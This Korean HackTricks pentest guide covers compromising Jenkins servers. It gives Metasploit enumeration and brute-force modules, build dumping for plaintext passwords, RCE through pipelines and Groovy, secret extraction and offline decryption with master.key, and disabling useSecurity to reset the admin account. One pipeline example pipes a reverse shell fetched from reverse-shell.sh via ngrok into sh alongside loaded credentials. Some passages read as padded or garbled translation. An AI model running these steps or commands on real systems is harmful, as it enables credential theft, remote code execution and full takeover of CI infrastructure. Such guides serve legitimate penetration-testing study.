# Jenkins 보안

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 기본 정보

Jenkins는 **파이프라인을 사용하여 거의 모든** 프로그래밍 언어와 소스 코드 저장소의 **지속적인 통합** 또는 **지속적인 전달** (CI/CD) 환경을 간단하게 구축하는 도구입니다. 또한, 다양한 루틴 개발 작업을 자동화합니다. Jenkins는 개별 단계에 대한 스크립트 작성 필요성을 없애지는 않지만, 빌드, 테스트 및 배포 도구의 전체 시퀀스를 수동으로 구성하는 것보다 더 빠르고 견고한 통합 방법을 제공합니다.


{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## 인증되지 않은 열거

(_/people_ 또는 _/asynchPeople_과 같은 현재 사용자 목록을 나열하는) 인증 없이 Jenkins 페이지를 검색하려면 다음을 사용할 수 있습니다:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
인증 없이 명령을 실행할 수 있는지 확인하세요:
```
msf> use auxiliary/scanner/http/jenkins_command
```
자격 증명이 없으면 _**/asynchPeople/**_ 경로나 _**/securityRealm/user/admin/search/index?q=**_에서 **사용자 이름**을 확인할 수 있습니다.

Jenkins 버전은 _**/oops**_ 또는 _**/error**_ 경로에서 확인할 수 있습니다.

![](<../../.gitbook/assets/image (48).png>)

### 알려진 취약점

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## 로그인

기본 정보에서 **Jenkins에 로그인하는 모든 방법**을 확인할 수 있습니다:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 등록

Jenkins 인스턴스를 찾을 수 있으며, **계정을 생성하고 로그인할 수 있습니다. 그렇게 간단합니다.**

### **SSO 로그인**

또한, **SSO 기능/플러그인**이 존재하는 경우, 테스트 계정(예: 테스트 **Github/Bitbucket 계정**)을 사용하여 응용 프로그램에 **로그인**을 시도해야 합니다. [**여기**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)의 트릭을 사용하세요.

### 브루트포스

**Jenkins**는 **암호 정책**과 **사용자 이름 브루트포스 방지** 기능이 부족합니다. **약한 암호**나 **사용자 이름을 암호로 사용하는 경우** 또는 **사용자 이름을 반대로 사용하는 경우** 사용자를 **브루트포스**해야 합니다.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

[이 파이썬 스크립트](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) 또는 [이 파워셸 스크립트](https://github.com/chryzsh/JenkinsPasswordSpray)를 사용하세요.

### IP Whitelisting 우회

많은 조직은 GitHub 또는 GitLab과 같은 **SaaS 기반 소스 제어 관리 (SCM) 시스템**을 **Jenkins** 또는 **TeamCity**와 같은 **내부, 자체 호스팅 CI** 솔루션과 결합합니다. 이러한 설정을 통해 CI 시스템은 주로 파이프라인 작업을 트리거하기 위해 SaaS 소스 제어 공급업체로부터 웹훅 이벤트를 수신합니다.

이를 위해 조직은 **SCM 플랫폼의 IP 범위**를 **화이트리스트**에 등록하여 웹훅을 통해 **내부 CI 시스템**에 액세스할 수 있도록 허용합니다. 그러나 중요한 점은 **누구나** GitHub 또는 GitLab에서 계정을 생성하고 웹훅을 구성하여 **내부 CI 시스템**으로 요청을 보낼 수 있다는 것입니다.

확인:
[shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## 내부 Jenkins 남용

이러한 시나리오에서는 Jenkins에 액세스할 수 있는 유효한 계정이 있다고 가정합니다.

{% hint style="warning" %}
Jenkins에서 구성된 **인증** 메커니즘과 침해된 사용자의 권한에 따라 다음 공격을 수행할 수 있을 수도 있고 없을 수도 있습니다.
{% endhint %}

자세한 정보는 기본 정보를 확인하세요:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 사용자 목록 나열

Jenkins에 액세스한 경우 [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)에서 등록된 다른 사용자를 나열할 수 있습니다.

### 평문 비밀번호를 찾기 위해 빌드 덤프

[이 스크립트](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py)를 사용하여 빌드 콘솔 출력과 빌드 환경 변수를 덤프하여 평문 비밀번호를 찾을 수 있습니다.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH 자격 증명 도용**

해킹된 사용자가 **새로운 Jenkins 노드를 생성/수정할 권한**을 가지고 있고 이미 다른 노드에 액세스하기 위해 SSH 자격 증명이 저장되어 있는 경우, 그는 노드를 생성/수정하고 호스트 키를 확인하지 않고 자격 증명을 기록할 호스트를 설정함으로써 해당 자격 증명을 **도용**할 수 있습니다:

![](<../../.gitbook/assets/image (56).png>)

일반적으로 Jenkins ssh 자격 증명은 **전역 공급자** (`/credentials/`)에서 찾을 수 있으므로 다른 비밀과 마찬가지로 덤프할 수도 있습니다. 자세한 정보는 [**비밀 덤프 섹션**](./#dumping-secrets)을 참조하세요.

### **Jenkins에서 RCE (원격 코드 실행)하기**

Jenkins 서버에서 **쉘을 획득**하면 공격자는 모든 **비밀**과 **환경 변수**를 유출하고 동일한 네트워크에 있는 다른 기기를 **악용**하거나 심지어 **클라우드 자격 증명을 수집**할 수 있는 기회를 얻을 수 있습니다.

Jenkins는 기본적으로 **SYSTEM으로 실행**됩니다. 따라서 Jenkins를 침해하면 공격자는 **SYSTEM 권한**을 얻게 됩니다.

### **프로젝트 생성/수정으로 RCE 얻기**

프로젝트 생성/수정은 Jenkins 서버에서 RCE를 얻는 방법입니다:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovy 스크립트 실행으로 RCE 얻기**

새로운 프로젝트를 생성하는 것보다 더 은밀한 방법으로 Groovy 스크립트를 실행하여 RCE를 얻을 수도 있습니다:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### 파이프라인 생성/수정으로 RCE 얻기

파이프라인을 생성/수정함으로써 **RCE를 얻을 수도 있습니다**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## 파이프라인 악용

파이프라인을 악용하려면 여전히 Jenkins에 액세스해야 합니다.

### 빌드 파이프라인

**파이프라인**은 프로젝트의 **빌드 메커니즘으로 사용**될 수도 있으며, 이 경우 **저장소 내부의 파일**에 파이프라인 구문이 포함될 수 있습니다. 기본적으로 `/Jenkinsfile`이 사용됩니다:

![](<../../.gitbook/assets/image (14) (1) (1).png>)

파이프라인 구성 파일을 다른 위치(예: 다른 저장소)에 **저장**하여 저장소 액세스와 파이프라인 액세스를 **분리**하는 것도 가능합니다.

공격자가 해당 파일에 **쓰기 액세스** 권한이 있다면 Jenkins에 액세스하지 않고도 파일을 **수정**하고 **파이프라인을 트리거**할 수 있습니다.\
공격자는 일부 브랜치 보호를 **우회**해야 할 수도 있습니다(플랫폼 및 사용자 권한에 따라 우회 가능 여부가 달라질 수 있음).

사용자가 **외부 사용자**인 경우 **다른 사용자/조직의 저장소의 주 브랜치에 PR을 생성**하고 **파이프라인을 트리거**할 것을 기대해서는 안 됩니다... 하지만 **잘못 구성된 경우**에는 이를 악용하여 기업을 완전히 **침해**할 수도 있습니다.

### 파이프라인 RCE

이전 RCE 섹션에서 이미 파이프라인을 수정하여 [**RCE를 얻는 기술**](./#rce-creating-modifying-pipeline)을 얻을 수 있다고 언급되었습니다.

### 환경 변수 확인

파이프라인 전체 또는 특정 단계에 대해 **평문 환경 변수**를 선언할 수 있습니다. 이러한 환경 변수에는 **민감한 정보가 포함되지 않아야 하지만**, 공격자는 항상 모든 파이프라인 구성/Jenkinsfile을 확인할 수 있습니다:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### 시크릿 덤프

Jenkins에서 시크릿이 일반적으로 어떻게 처리되는지에 대한 정보는 다음을 참조하십시오:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

자격 증명은 전역 공급자 (`/credentials/`) 또는 특정 프로젝트 (`/job/<project-name>/configure`)에 대해 범위를 지정할 수 있습니다. 따라서 모든 시크릿을 유출하려면 시크릿을 포함하는 모든 프로젝트를 적어도 **모두 침해**하고 사용자 정의/오염된 파이프라인을 실행해야 합니다.

또 다른 문제는 파이프라인의 환경에서 **시크릿을 얻으려면 시크릿의 이름과 유형을 알아야 한다는 것**입니다. 예를 들어, **`usernamePassword`** **시크릿**을 **`string`** **시크릿**으로 **로드**하려고 하면 다음과 같은 **오류**가 발생합니다:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
다음은 일반적인 비밀 유형을 로드하는 방법입니다:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
이 페이지의 끝에서 **모든 자격 증명 유형을 찾을 수 있습니다**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**모든 비밀을 한 번에 덤프하는 가장 좋은 방법**은 **Jenkins** 머신을 **침해**하는 것입니다(예: **내장 노드**에 역쉘 실행) 그리고 그런 다음 오프라인에서 **마스터 키**와 **암호화된 비밀**을 노출시킵니다.\
이에 대한 자세한 내용은 [노드 및 에이전트 섹션](./#nodes-and-agents)과 [포스트 익스플로잇 섹션](./#post-exploitation)에서 확인할 수 있습니다.
{% endhint %}

### 트리거

[문서](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)에서: `triggers` 지시문은 **파이프라인이 다시 트리거되는 자동화된 방법을 정의**합니다. GitHub 또는 BitBucket과 같은 소스와 통합된 파이프라인의 경우, 웹훅 기반 통합이 이미 존재하기 때문에 `triggers`가 필요하지 않을 수 있습니다. 현재 사용 가능한 트리거는 `cron`, `pollSCM` 및 `upstream`입니다.

크론 예시:
```bash
triggers { cron('H */4 * * 1-5') }
```
**다른 예시는 문서에서 확인하세요**.

### 노드 및 에이전트

**Jenkins 인스턴스**에는 **다른 기기에서 실행되는 다른 에이전트**가 있을 수 있습니다. 공격자의 관점에서 다른 기기에 대한 액세스는 도난당할 수 있는 **다른 클라우드 자격 증명** 또는 다른 기기를 악용하여 악용할 수 있는 **다른 네트워크 액세스**를 의미합니다.

자세한 정보는 다음의 기본 정보를 확인하세요:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

`/computer/`에서 **구성된 노드**를 열거할 수 있습니다. 일반적으로 \*\*`Built-In Node` \*\* (Jenkins를 실행하는 노드)와 추가적인 노드를 찾을 수 있습니다:

![](<../../.gitbook/assets/image (25).png>)

**Built-In 노드를 침해하는 것이 특히 흥미로운데**, 이는 민감한 Jenkins 정보를 포함하고 있기 때문입니다.

**파이프라인을** **내장된 Jenkins 노드에서 실행**하려면 파이프라인 내에서 다음 구성을 지정하면 됩니다:
```bash
pipeline {
agent {label 'built-in'}
```
### 완전한 예제

특정 에이전트에서 실행되는 파이프라인, cron 트리거, 파이프라인 및 스테이지 환경 변수를 가지고, 한 단계에서 2개의 변수를 로드하고 역쉘을 전송하는 예제입니다:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## 사후 침투

### Metasploit

Metasploit은 강력한 보안 도구로, 다양한 공격 벡터를 사용하여 시스템을 침투하고 제어할 수 있습니다. 이 도구는 다양한 모듈을 제공하며, 이를 통해 다양한 공격 기법을 사용할 수 있습니다. Metasploit은 명령줄 인터페이스와 그래픽 사용자 인터페이스를 모두 제공하며, 사용자는 편리한 방법으로 시스템을 공격할 수 있습니다. Metasploit은 취약점 스캐닝, 악성 코드 인젝션, 원격 명령 실행 등 다양한 공격 기능을 제공합니다. 이 도구를 사용하여 시스템을 침투하고 제어하는 방법을 배우고 응용할 수 있습니다.
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

당신은 충분한 권한이 있다면 `/credentials/`에 접근하여 비밀을 나열할 수 있습니다. 이는 `credentials.xml` 파일 내의 비밀만 나열하지만, **빌드 구성 파일**에는 더 많은 자격 증명이 있을 수 있습니다.

각 프로젝트의 구성을 볼 수 있다면, 해당 프로젝트에서 저장소에 액세스하고 **프로젝트의 다른 자격 증명**을 사용하는 **자격 증명(비밀)**의 이름도 볼 수 있습니다.

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

#### Groovy에서

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### 디스크에서

다음 파일들은 Jenkins 비밀을 **복호화하는 데 필요합니다**:

* secrets/master.key
* secrets/hudson.util.Secret

이러한 **비밀은 일반적으로 다음 위치에** 있을 수 있습니다:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

다음은 그들을 찾기 위한 정규식입니다:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkins 비밀 정보 오프라인 복호화

만약 **비밀 정보를 복호화하기 위해 필요한 암호를 덤프**했다면, [**이 스크립트**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py)를 사용하여 **해당 비밀 정보를 복호화**하세요.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovy에서 Jenkins 비밀번호 해독하기

Jenkins에서는 보안을 위해 암호화된 형식으로 저장된 비밀번호를 사용합니다. 그러나 Groovy 스크립트를 사용하여 이러한 비밀번호를 해독할 수 있습니다.

아래의 스크립트를 사용하여 Jenkins에서 암호화된 비밀번호를 해독할 수 있습니다.

```groovy
import hudson.util.Secret

def secret = Secret.decrypt("<encrypted_password>")
println(secret.getPlainText())
```

위의 스크립트에서 `<encrypted_password>` 부분에는 Jenkins에서 얻은 암호화된 비밀번호를 입력해야 합니다. 이 스크립트를 실행하면 암호화된 비밀번호가 해독되어 텍스트 형식으로 출력됩니다.

이를 통해 Jenkins에서 사용되는 암호화된 비밀번호를 해독하여 필요한 정보를 얻을 수 있습니다.
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### 새로운 관리자 사용자 생성

1. `/var/lib/jenkins/config.xml` 또는 `C:\Program Files (x86)\Jenkis\`에서 Jenkins config.xml 파일에 액세스합니다.
2. `<useSecurity>true</useSecurity>`라는 단어를 찾아서 단어 **`true`**를 **`false`**로 변경합니다.
3. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml` 명령을 실행합니다.
4. **Jenkins** 서버를 **재시작**합니다: `service jenkins restart`
5. 이제 다시 Jenkins 포털로 이동하면 **Jenkins가 자격 증명을 요청하지 않습니다**. "**Manage Jenkins**"로 이동하여 **관리자 비밀번호를 다시 설정**합니다.
6. 설정을 `<useSecurity>true</useSecurity>`로 변경하고 Jenkins를 **다시 시작**하여 **보안을 다시 활성화**합니다.

## 참고 자료

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family)인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>
